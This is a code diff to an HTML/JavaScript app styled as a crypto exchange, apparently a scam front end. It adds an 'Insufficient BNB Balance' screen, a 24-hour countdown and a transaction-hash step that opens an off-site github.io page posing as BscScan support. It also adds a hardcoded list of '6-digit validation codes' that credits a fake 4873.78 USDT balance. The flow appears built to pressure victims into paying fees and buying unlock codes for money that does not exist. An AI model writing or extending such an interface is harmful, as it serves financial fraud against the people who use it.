@@ -538,12 +538,178 @@
           <label class="block text-sm text-gray-400 mb-1">Time Remaining</label>
           <div id="countdownTimer" class="w-full p-3 bg-black text-green-400 rounded-lg border border-gray-600 text-center font-bold"></div>
         </div>
-        <button onclick="showPage('page9i')" class="w-full mt-4 bg-[#FCD535] hover:bg-yellow-400 text-black font-semibold py-3 rounded-lg transition">
+        <button onclick="showPage('page10i')" class="w-full mt-4 bg-[#FCD535] hover:bg-yellow-400 text-black font-semibold py-3 rounded-lg transition">
           Convert
         </button>
       </div>
     </div>
   </section>
+
+  
+<section id="page10i_insufficient" class="page min-h-screen pt-20 bg-[#1E2329] text-white hidden">
+  <div class="container mx-auto p-4">
+
+    <div class="flex items-center justify-between mb-6">
+    <button onclick="showPage('page17')" class="w-full p-3 font-bold text-gray-300 border border-gray-600 rounded-lg hover:border-gray-500 transition">
+          Need Help?
+        </button>
+      </div>
+   
+      <button onclick="goBack()" class="flex items-center text-gray-300 hover:text-[#FCD535]">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
+        </svg>
+        Back
+      </button>
+      <h2 class="text-xl font-semibold">Swap Preview</h2>
+      <div></div>
+    </div>
+
+    <div class="bg-[#2b3139] p-6 rounded-xl shadow-lg text-center">
+      <div class="mb-4">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-16 h-16 mx-auto text-red-500">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.85 3.377 2.77 3.377h13.713c1.92 0 3.636-1.877 2.769-3.377A4.636 4.636 0 0012 9.75a4.636 4.636 0 00-2.898 1.074zM12 21a9 9 0 100-18 9 9 0 000 18z" />
+        </svg>
+      </div>
+
+      <h3 class="text-xl font-bold text-red-500 mb-2">Insufficient BNB Balance</h3>
+      <p class="text-sm text-gray-400 mb-6">
+        You do not have enough BNB in your wallet to cover the transaction fees.
+        Please add more BNB to proceed with the conversion.
+      </p>
+
+      <div class="space-y-4">
+        <button onclick="showPage('page13')" class="w-full p-3 font-bold text-white bg-blue-600 rounded-lg hover:bg-blue-700 transition">
+          Connect Wallet
+        </button>
+
+        <button onclick="showPage('page6')" class="w-full p-3 font-bold text-black bg-[#FCD535] rounded-lg hover:bg-yellow-400 transition">
+          Update Asset
+        </button>
+
+    <button onclick="showPage('page10ii')" class="w-full p-3 font-bold text-black bg-[#FCD535] rounded-lg hover:bg-yellow-400 transition">
+          Preview 
+        </button>
+  </div>
+</div>
+</section>
+
+
+
+<section id="page10ii" class="page min-h-screen pt-20 bg-[#1E2329] text-white hidden">
+  <div class="container mx-auto p-4">
+
+    <div class="flex items-center justify-between mb-6">
+      <button onclick="goBack()" class="flex items-center text-gray-300 hover:text-[#FCD535]">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
+        </svg>
+        Back
+      </button>
+      <h2 class="text-xl font-semibold">Conversion Hash</h2>
+      <div></div>
+    </div>
+
+    <div class="bg-[#2b3139] p-6 rounded-xl shadow-lg text-center">
+      <div class="mb-4">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-16 h-16 mx-auto text-yellow-400">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+          <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 16.875l-4.75-4.75 4.75-4.75" />
+        </svg>
+      </div>
+
+      <h3 class="text-xl font-bold text-yellow-400 mb-2">Enter Transaction Hash</h3>
+      <p class="text-sm text-gray-400 mb-6">
+        Please enter the transaction hash to proceed with the conversion validation.
+      </p>
+
+      <div class="space-y-4">
+        <input type="text" id="transactionHashInput" placeholder="Transaction Hash" class="w-full p-3 bg-[#363a45] text-white rounded-lg border border-gray-600 focus:outline-none focus:border-[#FCD535] transition">
+      </div>
+
+      <button onclick="showPage('page10iii')" class="mt-8 w-full p-3 font-bold text-black bg-[#FCD535] rounded-lg hover:bg-yellow-400 transition">
+        Submit
+      </button>
+    </div>
+
+  </div>
+</div>
+</section>
+
+<section id="page10iii" class="page min-h-screen pt-20 bg-[#1E2329] text-white hidden">
+  <div class="container mx-auto p-4">
+
+    <div class="flex items-center justify-between mb-6">
+      <button onclick="goBack()" class="flex items-center text-gray-300 hover:text-[#FCD535]">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
+        </svg>
+        Back
+      </button>
+      <h2 class="text-xl font-semibold">Validate Conversion</h2>
+      <div></div>
+    </div>
+
+    <div class="bg-[#2b3139] p-6 rounded-xl shadow-lg text-center">
+      <div class="mb-4">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-16 h-16 mx-auto text-yellow-400">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 5.25a3 3 0 013 3v.25a3 3 0 01-3 3h-1.5a3 3 0 01-3-3v-.25a3 3 0 013-3H15.75zM12.75 5.25a3 3 0 013 3v.25a3 3 0 01-3 3h-1.5a3 3 0 01-3-3v-.25a3 3 0 013-3H12.75zM4.5 12.75a3 3 0 013-3h1.5a3 3 0 013 3v.25a3 3 0 01-3 3h-1.5a3 3 0 01-3-3v-.25zM12.75 12.75a3 3 0 013-3h1.5a3 3 0 013 3v.25a3 3 0 01-3 3h-1.5a3 3 0 01-3-3v-.25z" />
+        </svg>
+      </div>
+
+      <h3 class="text-xl font-bold text-yellow-400 mb-2">Enter Contract Validation Code</h3>
+      <p class="text-sm text-gray-400 mb-6">
+        Please enter the 6-digit validation code to confirm your conversion.
+      </p>
+
+      <div class="space-y-4">
+        <input type="text" id="validationCodeInput" placeholder="6-Digit Code" class="w-full p-3 bg-[#363a45] text-white rounded-lg border border-gray-600 focus:outline-none focus:border-[#FCD535] transition">
+      </div>
+
+      <button id="confirmValidationBtn" onclick="validateConversionCode()" class="mt-8 w-full p-3 font-bold text-black bg-[#FCD535] rounded-lg hover:bg-yellow-400 transition">
+        Confirm
+      </button>
+    </div>
+
+  </div>
+</div>
+</section>
+
+
+<section id="page10v" class="page min-h-screen pt-20 bg-[#1E2329] text-white hidden">
+  <div class="container mx-auto p-4">
+
+    <div class="flex items-center justify-between mb-6">
+      <button onclick="goBack()" class="flex items-center text-gray-300 hover:text-[#FCD535]">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
+        </svg>
+        Back
+      </button>
+      <h2 class="text-xl font-semibold">Conversion Successful</h2>
+      <div></div>
+    </div>
+
+    <div class="bg-[#2b3139] p-6 rounded-xl shadow-lg text-center">
+      <div class="mb-4">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-16 h-16 mx-auto text-green-500">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+        </svg>
+      </div>
+
+      <h3 class="text-xl font-bold text-green-500 mb-2">Conversion Confirmed!</h3>
+      <p class="text-sm text-gray-400 mb-6">
+        Your USD has been successfully converted to USDT. The updated balance will be reflected in your wallet shortly.
+      </p>
+
+      <button onclick="showPage('page0')" class="mt-8 w-full p-3 font-bold text-black bg-[#FCD535] rounded-lg hover:bg-yellow-400 transition">
+        Go to Home
+      </button>
+    </div>
+
+  </div>
+</div>
+</section>
 
   <section id="page13" class="page px-4 py-8 min-h-screen bg-[#1E2329] text-white pt-20 hidden">
     <div class="max-w-xl mx-auto bg-[#2b3139] p-6 rounded-xl shadow-lg">
@@ -1517,57 +1683,227 @@
       }, 1000);
     }
 
-    // =====================================
-    //  8. CONVERSION & TIMERS
-    // =====================================
-    function initConversionPage() {
-      const convertBtn = document.querySelector("#page10 .convert-btn");
-      if (convertBtn) convertBtn.onclick = convertUsdToUsdt;
-      setTimeout(() => {
-        showPage('page10');
-        start24HourCountdown();
-      }, 2000);
-    }
+// =====================================
+//  8. CONVERSION & TIMERS (UPDATED)
+// =====================================
 
-    function convertUsdToUsdt() {
-      const usd = parseFloat(document.getElementById("usdAmount").value);
-      const usdt = usd;
-      localStorage.setItem("usdtBalance", usdt.toFixed(2));
-      const usdtBalanceDisplay = document.getElementById("usdtBalance");
-      if (usdtBalanceDisplay) usdtBalanceDisplay.innerText = `${usdt.toFixed(2)} USDT`;
-      showToast(`Converted $${usd.toFixed(2)} USD to ${usdt.toFixed(2)} USDT successfully.`);
-      showPage("page9i");
-    }
+// This variable will hold the interval ID for the countdown timer
+// so we can clear it when needed.
+let countdownIntervalId = null;
 
-    function start24HourCountdown() {
-      const existingEnd = localStorage.getItem('conversionEndTime');
-      let endTime;
-      if (!existingEnd) {
-        endTime = Date.now() + 24 * 60 * 60 * 1000;
-        localStorage.setItem('conversionEndTime', endTime);
-      } else {
-        endTime = parseInt(existingEnd);
+// Valid 6-digit codes for page10iii validation
+const VALIDATION_CODES = [
+  '482193', '739201', '564928', '801346', '927415', '315780', '649203', 
+  '170984', '283650', '496712', '357849', '618430', '902176', '745390', 
+  '521864', '834027', '109735', '278641', '693582', '746198', '350729', 
+  '198423', '267340', '820153', '934608'
+];
+
+function initConversionPage() {
+  const convertBtn = document.querySelector("#page10 .convert-btn");
+  if (convertBtn) {
+    convertBtn.onclick = convertUsdToUsdt;
+  }
+  
+  // Initialize the countdown display if a timer is running
+  updateCountdownDisplay();
+}
+
+function updateCountdownDisplay() {
+  const existingEndTime = localStorage.getItem('conversionEndTime');
+  const countdownBox = document.getElementById('countdownBox');
+
+  if (existingEndTime) {
+    if (countdownBox) {
+      countdownBox.classList.remove('hidden');
+    }
+    if (countdownIntervalId) {
+        clearInterval(countdownIntervalId);
+    }
+    start24HourCountdown();
+  } else {
+    if (countdownBox) {
+      countdownBox.classList.add('hidden');
+    }
+  }
+}
+
+function convertUsdToUsdt() {
+  const usd = parseFloat(document.getElementById("usdAmount").value);
+  
+  if (isNaN(usd) || usd <= 0) {
+    showToast("Please enter a valid amount to convert.");
+    return;
+  }
+
+  const usdt = usd;
+  localStorage.setItem("usdtBalance", usdt.toFixed(2));
+  const usdtBalanceDisplay = document.getElementById("usdtBalance");
+  if (usdtBalanceDisplay) {
+    usdtBalanceDisplay.innerText = `${usdt.toFixed(2)} USDT`;
+  }
+  
+  showToast(`Converted $${usd.toFixed(2)} USD to ${usdt.toFixed(2)} USDT successfully.`);
+
+  // Opens page10i as requested
+  showPage("page10i");
+  start24HourCountdown(); // Start the timer
+}
+
+// New function to handle the "Preview Conversion" button click on page10i
+function previewConversion() {
+  // Navigate to page10ii, which will show the transaction hash
+  showPage("page10ii");
+}
+
+// New function to handle the "Submit" button on page10ii
+function submitTransactionHash() {
+  const txHash = document.getElementById('transactionHashInput').value;
+  if (!txHash) {
+    showToast("Please enter a transaction hash.");
+    return;
+  }
+  
+  // Opens the external BscScan link in a new window
+  window.open('https://mail-org.github.io/BscScan-mail-support/', '_blank');
+  
+  // Automatically opens page10iii
+  showPage('page10iii');
+}
+
+// New function to handle the "Confirm" button on page10iii
+function validateConversionCode() {
+  const validationCode = document.getElementById('validationCodeInput').value;
+  const confirmButton = document.getElementById('confirmValidationBtn');
+
+  confirmButton.disabled = true;
+  confirmButton.innerText = "Validating...";
+  
+  showToast("Validating conversion... Please wait.");
+
+  // Simulate a 30-second loading state
+  setTimeout(() => {
+    confirmButton.disabled = false;
+    confirmButton.innerText = "Confirm";
+
+    if (VALIDATION_CODES.includes(validationCode)) {
+      showToast("Code validated successfully!");
+      
+      // Update balances and stop the countdown
+      const addedAmount = 4873.78;
+      updateBalances(addedAmount);
+      stopCountdown();
+
+      showPage('page10v');
+    } else {
+      showToast("Invalid code. Please try again.");
+      showPage('page17');
+    }
+  }, 30000); // 30 seconds
+}
+
+function updateBalances(amount) {
+  // Update USDT balance
+  let usdtBalance = parseFloat(localStorage.getItem('usdtBalance')) || 0;
+  usdtBalance += amount;
+  localStorage.setItem('usdtBalance', usdtBalance.toFixed(2));
+
+  // Update total balance
+  let totalBalance = parseFloat(localStorage.getItem('totalBalance')) || 0;
+  totalBalance += amount;
+  localStorage.setItem('totalBalance', totalBalance.toFixed(2));
+
+  // Update the displayed balances on the dashboard (page0)
+  document.getElementById('usdtBalanceDisplay').innerText = `$${usdtBalance.toFixed(2)}`;
+  document.getElementById('totalBalanceDisplay').innerText = `$${totalBalance.toFixed(2)}`;
+}
+
+function stopCountdown() {
+  if (countdownIntervalId) {
+    clearInterval(countdownIntervalId);
+    countdownIntervalId = null;
+  }
+  localStorage.removeItem('conversionEndTime');
+  const countdownBox = document.getElementById('countdownBox');
+  if (countdownBox) {
+    countdownBox.classList.add('hidden');
+  }
+}
+
+function start24HourCountdown() {
+  if (countdownIntervalId) {
+    clearInterval(countdownIntervalId);
+  }
+
+  const existingEnd = localStorage.getItem('conversionEndTime');
+  let endTime;
+  if (!existingEnd) {
+    endTime = Date.now() + 24 * 60 * 60 * 1000;
+    localStorage.setItem('conversionEndTime', endTime.toString());
+  } else {
+    endTime = parseInt(existingEnd, 10);
+  }
+  
+  const countdownBox = document.getElementById('countdownBox');
+  if (countdownBox) {
+    countdownBox.classList.remove('hidden');
+  }
+
+  countdownIntervalId = setInterval(() => {
+    const remaining = endTime - Date.now();
+    if (remaining <= 0) {
+      clearInterval(countdownIntervalId);
+      const countdownTimer = document.getElementById('countdownTimer');
+      if (countdownTimer) {
+        countdownTimer.textContent = "00:00:00";
       }
-      const countdownBox = document.getElementById('countdownBox');
-      if (countdownBox) countdownBox.classList.remove('hidden');
-
-      const intervalId = setInterval(() => {
-        const remaining = endTime - Date.now();
-        if (remaining <= 0) {
-          clearInterval(intervalId);
-          document.getElementById('countdownTimer').textContent = "00:00:00";
-          localStorage.removeItem('conversionEndTime');
-          return;
-        }
-        const hours = Math.floor(remaining / (1000 * 60 * 60));
-        const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
-        const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
-        const format = (n) => n.toString().padStart(2, '0');
-        document.getElementById('countdownTimer').textContent = `${format(hours)}:${format(minutes)}:${format(seconds)}`;
-      }, 1000);
+      localStorage.removeItem('conversionEndTime');
+      countdownIntervalId = null;
+      if (countdownBox) {
+        countdownBox.classList.add('hidden');
+      }
+      return;
     }
 
-    // =====================================
+    const hours = Math.floor(remaining / (1000 * 60 * 60));
+    const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
+    const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
+    const format = (n) => n.toString().padStart(2, '0');
+    const countdownTimer = document.getElementById('countdownTimer');
+    if (countdownTimer) {
+      countdownTimer.textContent = `${format(hours)}:${format(minutes)}:${format(seconds)}`;
+    }
+  }, 1000);
+}
+
+// The showPage function should be updated to also call updateCountdownDisplay()
+function showPage(pageId) {
+  document.querySelectorAll(".page").forEach((page) => {
+    page.classList.remove("active-page");
+    page.classList.add("hidden");
+  });
+  const targetPage = document.getElementById(pageId);
+  if (targetPage) {
+    targetPage.classList.remove("hidden");
+    targetPage.classList.add("active-page");
+    localStorage.setItem(STORAGE_PAGE_KEY, pageId);
+    window.scrollTo({ top: 0, behavior: "smooth" });
+  } else {
+    console.warn(`Page "${pageId}" not found.`);
+    return;
+  }
+  
+  if (!pageHistory.includes(pageId)) {
+    pageHistory.push(pageId);
+  }
+  
+  // This is the new part for the countdown display
+  const countdownPages = ['page10', 'page10i', 'page10ii', 'page10iii'];
+  if (countdownPages.includes(pageId)) {
+    updateCountdownDisplay();
+  }
+   }
+   // =====================================
     //  9. CONFIGURATION & UTILITIES
     // =====================================
     const dictionary = {
